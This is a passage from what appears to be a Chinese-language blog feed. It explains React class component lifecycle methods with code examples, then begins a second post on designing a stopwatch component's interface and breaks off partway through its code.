title="（1）constructor"></a>（1）constructor</h3><p>组件的构造函数，第一个被执行，若没有显式定义它，会有一个默认的构造函数，但是若显式定义了构造函数，我们必须在构造函数中执行 <code>super(props)</code>（<code>super(...arguements)</code>更好），否则无法在构造函数中拿到 this。</p><p>如果不初始化 state 或不进行方法绑定，则不需要为 React 组件实现构造函数<strong>Constructor</strong>。</p><p>constructor 中通常只做两件事： <br />● 初始化组件的 state<br />● 给事件处理方法绑定 this</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">  <span class="variable language_">super</span>(props);</span><br><span class="line">  <span class="comment">// 不要在构造函数中调用 setState，可以直接给 state 设置初始值</span></span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">state</span> = &#123; <span class="attr">counter</span>: <span class="number">0</span> &#125;</span><br><span class="line">  <span class="variable language_">this</span>.<span class="property">handleClick</span> = <span class="variable language_">this</span>.<span class="property">handleClick</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="vKnKh"></a></p><h3 id="（2）getDerivedStateFromProps"><a href="#（2）getDerivedStateFromProps" class="headerlink" title="（2）getDerivedStateFromProps"></a>（2）getDerivedStateFromProps</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="title function_">getDerivedStateFromProps</span>(props, state)</span><br></pre></td></tr></table></figure><p>这是个静态方法，所以不能在这个函数里使用 <code>this</code>，有两个参数 <code>props</code> 和 <code>state</code>，分别指接收到的新参数和当前组件的 <code>state</code> 对象，这个函数会返回一个对象用来更新当前的 <code>state</code> 对象，如果不需要更新可以返回 <code>null</code>。</p><p>该函数会在装载时，接收到新的 <code>props</code> 或者调用了 <code>setState</code> 和 <code>forceUpdate</code> 时被调用。如当我们接收到新的属性想修改我们的 <code>state</code> ，就可以使用。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 当 props.counter 变化时，赋值给 state</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">getDerivedStateFromProps</span>(<span class="params">props, state</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (props.<span class="property">counter</span> !== state.<span class="property">counter</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">counter</span>: props.<span class="property">counter</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  handleClick = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">counter</span> + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick&#125;</span>&gt;</span>Hello, world!&#123;this.state.counter&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br />现在我们可以显式传入 <code>counter</code> ，但是这里有个问题，如果我们想要通过点击实现 <code>state.counter</code> 的增加，但这时会发现值不会发生任何变化，一直保持 <code>props</code> 传进来的值。这是由于在 <code>React 16.4^</code> 的版本中 <code>setState</code> 和 <code>forceUpdate</code> 也会触发这个生命周期，所以当组件内部 <code>state</code> 变化后，就会重新走这个方法，同时会把 <code>state</code> 值赋值为 <code>props</code> 的值。因此我们需要多加一个字段来记录之前的 <code>props</code> 值，这样就会解决上述问题。具体如下：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里只列出需要变化的地方</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="comment">// 增加一个 preCounter 来记录之前的 props 传来的值</span></span><br><span class="line">      <span class="attr">preCounter</span>: <span class="number">0</span>,</span><br><span class="line">      <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">static</span> <span class="title function_">getDerivedStateFromProps</span>(<span class="params">props, state</span>) &#123;</span><br><span class="line">    <span class="comment">// 跟 state.preCounter 进行比较</span></span><br><span class="line">    <span class="keyword">if</span> (props.<span class="property">counter</span> !== state.<span class="property">preCounter</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> &#123;</span><br><span class="line">        <span class="attr">counter</span>: props.<span class="property">counter</span>,</span><br><span class="line">        <span class="attr">preCounter</span>: props.<span class="property">counter</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span></span><br><span class="line">  &#125;</span><br><span class="line">  handleClick = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">counter</span> + <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;<span class="name">h1</span> <span class="attr">onClick</span>=<span class="string">&#123;this.handleClick&#125;</span>&gt;</span>Hello, world!&#123;this.state.counter&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="pATOn"></a></p><h3 id="（3）render"><a href="#（3）render" class="headerlink" title="（3）render"></a>（3）render</h3><p><code>render</code>是 React 中最核心的方法，一个组件中必须要有这个方法，它会根据状态 state 和属性 props 渲染组件。这个函数只做一件事，就是返回需要渲染的内容，所以不要在这个函数内做其他业务逻辑，通常调用该方法会返回以下类型中一个：<br />● <strong>React 元素</strong>：这里包括原生的 DOM 以及 React 组件；<br />● <strong>数组和 Fragment（片段）</strong>：可以返回多个元素；<br />● <strong>Portals（插槽）</strong>：可以将子元素渲染到不同的 DOM 子树种；<br />● <strong>字符串和数字</strong>：被渲染成 DOM 中的 text 节点；<br />● <strong>布尔值或 null</strong>：不渲染任何内容。</p><p><a name="YUAV9"></a></p><h3 id="（4）componentDidMount"><a href="#（4）componentDidMount" class="headerlink" title="（4）componentDidMount()"></a>（4）componentDidMount()</h3><p><code>componentDidMount()</code>会在组件挂载后（插入 DOM 树中）立即调。该阶段通常进行以下操作：<br />● 执行依赖于 DOM 的操作；<br />● 发送网络请求；（官方建议）<br />● 添加订阅消息（会在<code>componentWillUnmount</code>取消订阅）；</p><p>如果在 <code>componentDidMount</code> 中调用 <code>setState</code> ，就会触发一次额外的渲染，多调用了一次 <code>render</code> 函数，由于它是在浏览器刷新屏幕前执行的，所以用户对此是没有感知的，但是我应当避免这样使用，这样会带来一定的性能问题，尽量是在 <code>constructor</code> 中初始化 <code>state</code> 对象。</p><p>在组件装载之后，将计数数字变为<code>1</code>：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>  &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props)</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  componentDidMount () &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">      <span class="attr">counter</span>: <span class="number">1</span></span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;</span><br><span class="line">  render ()  &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">className</span>=<span class="string">&quot;counter&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        counter值: &#123; this.state.counter &#125;</span></span><br><span class="line"><span class="language-xml">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br /><a name="R6cGX"></a>## 3. 组件更新阶段当组件的 props 改变了，或组件内部调用了 `setState/forceUpdate`，会触发更新重新渲染，这个过程可能会发生多次。这个阶段会依次调用下面这些方法：<br />●  `getDerivedStateFromProps`<br />●  `shouldComponentUpdate`<br />●  `render`<br />●  `getSnapshotBeforeUpdate`<br />●  `componentDidUpdate`<p><a name="wHhwJ"></a></p><h3 id="（1）shouldComponentUpdate"><a href="#（1）shouldComponentUpdate" class="headerlink" title="（1）shouldComponentUpdate"></a>（1）shouldComponentUpdate</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">shouldComponentUpdate</span>(nextProps, nextState)</span><br></pre></td></tr></table></figure><p>在说这个生命周期函数之前，我们看两个问题：<br /><strong>● <strong><code>**setState**</code></strong> 函数在任何情况下都会导致组件重新渲染吗？例如下面这种情况：</strong></p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;<span class="attr">number</span>: <span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">number</span>&#125;)</span><br></pre></td></tr></table></figure><p><br /><strong>● 如果没有调用 <strong><code>**setState**</code><strong>，</strong><code>**props**</code></strong> 值也没有变化，是不是组件就不会重新渲染？</strong></p><p>第一个问题答案是 <strong>会</strong> ，第二个问题如果是父组件重新渲染时，不管传入的 props 有没有变化，都会引起子组件的重新渲染。</p><p>那么有没有什么方法解决在这两个场景下不让组件重新渲染进而提升性能呢？这个时候 <code>shouldComponentUpdate</code> 登场了，这个生命周期函数是用来提升速度的，它是在重新渲染组件开始前触发的，默认返回 true，可以比较 <code>this.props</code> 和 <code>nextProps</code> ，<code>this.state</code> 和 <code>nextState</code> 值是否变化，来确认返回 true 或者 false。当返回 false 时，组件的更新过程停止，后续的 <code>render</code>、<code>componentDidUpdate</code> 也不会被调用。</p><p><strong>注意：</strong>添加 <code>shouldComponentUpdate</code> 方法时，不建议使用深度相等检查（如使用 <code>JSON.stringify()</code>），因为深比较效率很低，可能会比重新渲染组件效率还低。而且该方法维护比较困难，建议使用该方法会产生明显的性能提升时使用。</p><p><a name="Ew9z5"></a></p><h3 id="（2）getSnapshotBeforeUpdate"><a href="#（2）getSnapshotBeforeUpdate" class="headerlink" title="（2）getSnapshotBeforeUpdate"></a>（2）getSnapshotBeforeUpdate</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">getSnapshotBeforeUpdate</span>(prevProps, prevState)</span><br></pre></td></tr></table></figure><p>这个方法在 <code>render</code> 之后，<code>componentDidUpdate</code> 之前调用，有两个参数 <code>prevProps</code> 和 <code>prevState</code>，表示更新之前的 props 和 state，这个函数必须要和 <code>componentDidUpdate</code> 一起使用，并且要有一个返回值，默认是 null，这个返回值作为第三个参数传给 <code>componentDidUpdate</code>。</p><p>这个生命周期的使用场景较少，下面看一个处理滚动条位置的例子：</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ScrollingList</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line">    <span class="variable language_">super</span>(props);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">listRef</span> = <span class="title class_">React</span>.<span class="title function_">createRef</span>();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">getSnapshotBeforeUpdate</span>(<span class="params">prevProps, prevState</span>) &#123;</span><br><span class="line">    <span class="comment">// 增加了新的一条聊天消息</span></span><br><span class="line">    <span class="comment">// 获取滚动条位置，以便我们之后调整</span></span><br><span class="line">    <span class="keyword">if</span> (prevProps.<span class="property">list</span>.<span class="property">length</span> &lt; <span class="variable language_">this</span>.<span class="property">props</span>.<span class="property">list</span>.<span class="property">length</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> list = <span class="variable language_">this</span>.<span class="property">listRef</span>.<span class="property">current</span>;</span><br><span class="line">      <span class="keyword">return</span> list.<span class="property">scrollHeight</span> - list.<span class="property">scrollTop</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">componentDidUpdate</span>(<span class="params">prevProps, prevState, snapshot</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// snapshot 是上个生命周期的返回值，当有新消息加入时，调整滚动条位置，使新消息及时显示出来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (snapshot !== <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> list = <span class="variable language_">this</span>.<span class="property">listRef</span>.<span class="property">current</span>;</span><br><span class="line">      list.<span class="property">scrollTop</span> = list.<span class="property">scrollHeight</span> - snapshot;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ref</span>=<span class="string">&#123;this.listRef&#125;</span>&gt;</span>&#123;/* ...contents... */&#125;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><a name="juvXM"></a></p><h3 id="（3）componentDidUpdate"><a href="#（3）componentDidUpdate" class="headerlink" title="（3）componentDidUpdate"></a>（3）componentDidUpdate</h3><p><code>componentDidUpdate()</code> 会在更新后会被立即调用，首次渲染不会执行此方法。 该阶段通常进行以下操作：<br />● 当组件更新后，对 DOM 进行操作； <br />● 如果你对更新前后的 props 进行了比较，也可以选择在此处进行网络请求；（例如，当 props 未发生变化时，则不会执行网络请求）。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">componentDidUpdate</span>(<span class="params">prevProps, prevState, snapshot</span>)&#123;&#125;</span><br></pre></td></tr></table></figure><p>该方法有三个参数：<br />● <code>prevProps</code>: 更新前的 props<br />● <code>prevState</code>: 更新前的 state<br />● <code>snapshot</code>: <code>getSnapshotBeforeUpdate()</code>生命周期的返回值</p><p><a name="nul5h"></a></p><h2 id="4-组件卸载阶段"><a href="#4-组件卸载阶段" class="headerlink" title="4. 组件卸载阶段"></a>4. 组件卸载阶段</h2><p>卸载阶段只有一个生命周期函数，<code>componentWillUnmount() </code>会在组件卸载及销毁之前直接调用。在此方法中执行必要的清理操作：<br />● 清除 <code>timer</code>，取消网络请求或清除<br />● 取消在 <code>componentDidMount()</code> 中创建的订阅等；<br />这个生命周期在一个组件被卸载和销毁之前被调用，因此你不应该再这个方法中使用 <code>setState</code>，因为组件一旦被卸载，就不会再装载，也就不会重新渲染。</p><p><a name="uVq4d"></a></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5. 总结"></a>5. 总结</h2><p>除了上述生命周期函数，React 16 提供了一个内置函数 <code>componentDidCatch</code>，如果 <code>render()</code> 函数抛出错误，则会触发该函数，打印错误日志，并且显示回退的用户界面。它的出现，解决了早期的 React 开发中，一个小的组件抛出错误将会破坏整个应用程序的情况。</p><p>React 常见的生命周期如下：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1606974748814-56e52599-8cda-4305-8135-eaf64d75fbb9.png" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2020/png/1500604/1606974748814-56e52599-8cda-4305-8135-eaf64d75fbb9.png" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p><strong>React 常见生命周期的过程大致如下：</strong><br />● 挂载阶段，首先执行<code>constructor</code>构造方法，来创建组件<br />● 创建完成之后，就会执行<code>render</code>方法，该方法会返回需要渲染的内容<br />● 随后，React 会将需要渲染的内容挂载到 DOM 树上<br /><strong>● 挂载完成之后就会执行</strong><code>**componentDidMount**</code><strong>生命周期函数</strong><br />● 如果我们给组件创建一个 props（用于组件通信）、调用<code>setState</code>（更改 state 中的数据）、调用<code>forceUpdate</code>（强制更新组件）时，都会重新调用 render 函数<br />● <code>render</code>函数重新执行之后，就会重新进行 DOM 树的挂载<br /><strong>● 挂载完成之后就会执行</strong><code>**componentDidUpdate**</code><strong>生命周期函数</strong><br /><strong>● 当我们移除组件的时候，就会执行</strong><code>**componentWillUnmount**</code><strong>生命周期函数</strong></p><script type="text&#x2F;javascript" src="https://unpkg.com/kity@2.0.4/dist/kity.min.js"></script><script type="text&#x2F;javascript" src="https://unpkg.com/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text&#x2F;javascript" src="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text&#x2F;css" href="https://unpkg.com/hexo-simple-mindmap@0.8.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> React </category>
          
      </categories>
      
      
        <tags>
            
            <tag> React </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>React 组件实践</title>
      <link href="/2023/07/20/frontend/react/react-zu-jian-shi-jian/"/>
      <url>/2023/07/20/frontend/react/react-zu-jian-shi-jian/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="XOEwi"></a></p><h2 id="1-定义组件接口"><a href="#1-定义组件接口" class="headerlink" title="1. 定义组件接口"></a>1. 定义组件接口</h2><p>React 世界由组件构成，所以，如何设计组件的接口就成了组件设计最重要的事情。</p><p><a name="O43Jx"></a></p><h3 id="（1）设计原则"><a href="#（1）设计原则" class="headerlink" title="（1）设计原则"></a>（1）设计原则</h3><p>React 的组件其实就就是软件设计中的模块，所以其设计原则也遵从通用的组件设计原则，简单说来，就是要减少组件之间的耦合性（Coupling)，让组件的界面简单，这样才能让整体系统易于理解、易于维护。</p><p>在设计 React 组件时，要注意以下原则：<br />1. 保持接口小，props 数量要少；<br />2. 根据数据边界来划分组件，充分利用组合（composition）；<br />3. 把 state 往上层组件提取，让下层组件只需要实现为纯函数。</p><p>下面来看实现一个秒表（下图为 iPhone 上的秒表应用）：</p><p><img src="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/jpeg/1500604/1611478184254-27ddf015-c79b-4b10-ae96-424ecba3ab42.jpeg?x-oss-process=image/resize,w_500,limit_0/interlace,1" class="lazyload placeholder" data-srcset="https://img02.sogoucdn.com/v2/thumb/retype_exclude_gif/ext/auto/q/95/crop/xy/ai/t/0/?appid=122&url=cdn.nlark.com/yuque/0/2021/jpeg/1500604/1611478184254-27ddf015-c79b-4b10-ae96-424ecba3ab42.jpeg?x-oss-process=image/resize,w_500,limit_0/interlace,1" srcset="https://ossk.cc/file/c40b6c4ba22bbb6b6f944.gif"></p><p>对于这个秒表，按下右侧“启动”按钮，这个按钮就会变成“停止”，同时上面的数字时钟开始计时；按下“停止”按钮，数字时钟停止计时。左侧还有一个按钮，初始状态显示“复位”，点击该铵钮会清空时钟；开始计时之后，这个左侧按钮会变成“计次”，按一下“计次”，秒表底部就会增加一列时间，记录下按下“计次”这一瞬间的时刻。</p><p>下面来规划一下秒表的 React 组件接口如何设计。<br><a name="QuDEH"></a></p><h3 id="（2）组件的划分"><a href="#（2）组件的划分" class="headerlink" title="（2）组件的划分"></a>（2）组件的划分</h3><p>下面来实现一个 React 组件渲染整个秒表，这个组件叫 <code>StopWatch</code>，目前看来这个组件不需要从外部获得什么输入，本着“props 数量要少”的原则，也不需要管未来会用上什么 <code>props</code>，目前就当 <code>StopWatch</code> 不支持 <code>props</code>。</p><p>此外，这个组件需要记录当前计时，还要记录每一次按下“计次”的时间，所以需要维持状态（<code>state</code>），所以 <code>StopWatch</code> 是一个有状态的组件，不能只是一个纯函数，而是一个继承自 <code>Component</code> 的类。</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StopWatch</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="comment">//<span class="doctag">TODO:</span> 返回所有JSX</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 React 组件中，随着逻辑的复杂，JSX 代码越来越多，就需要拆分函数中的内容。在 React 中有一个误区，就是把 <code>render</code> 中的代码分拆到多个 <code>renderXXXX</code> 函数中去，比如下面这样：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StopWatch</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> majorClock = <span class="variable language_">this</span>.<span class="title function_">renderMajorClock</span>();</span><br><span class="line">    <span class="keyword">const</span> controlButtons = <span class="variable language_">this</span>.<span class="title function_">renderControlButtons</span>();</span><br><span class="line">    <span class="keyword">const</span> splitTimes = <span class="variable language_">this</span>.<span class="title function_">renderSplitTimes</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">       <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">          &#123;majorClock&#125;</span></span><br><span class="line"><span class="language-xml">          &#123;controlButtons&#125;</span></span><br><span class="line"><span class="language-xml">          &#123;splitTimes&#125;</span></span><br><span class="line"><span class="language-xml">       <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">    );</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">renderMajorClock</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="comment">//<span class="doctag">TODO:</span> 返回数字时钟的JSX</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">renderControlButtons</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="comment">//<span class="doctag">TODO:</span> 返回两个按钮的JSX</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">renderSplitTimes</span>(<span class="params"></span>) &#123;</span><br><span class="line">     <span class="comment">//<span class="doctag">TODO:</span> 返回所有计次时间的JSX</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br /> 用上面的方法组织代码，当然比写一个庞大的 <code>render</code> 函数要强，但是这些 <code>renderXXXX</code> 函数访问的是同样的 <code>props</code> 和 <code>state</code>，这样代码依然耦合在了一起。更好的方法是把这些 <code>renderXXXX</code> 重构成各自独立的 React 组件：</p><figure class="highlight tsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StopWatch</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">  <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> (</span><br><span class="line">       &lt;div&gt;</span><br><span class="line">          &lt;MajorClock&gt;</span><br><span class="line">          